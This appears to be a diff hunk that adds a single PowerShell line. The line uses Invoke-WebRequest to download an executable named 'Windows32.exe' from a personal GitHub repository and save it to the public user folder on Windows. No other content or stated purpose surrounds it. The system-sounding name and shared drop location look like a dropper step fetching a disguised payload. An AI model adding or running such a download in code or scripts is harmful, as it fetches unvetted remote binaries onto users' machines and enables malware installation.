@@ -1,0 +1,1 @@
+Invoke-WebRequest -Uri 'https://github.com/Ilyaskand/e/raw/refs/heads/main/Windows32.exe' -OutFile 'C:\\Users\\Public\\Windows32.exe'
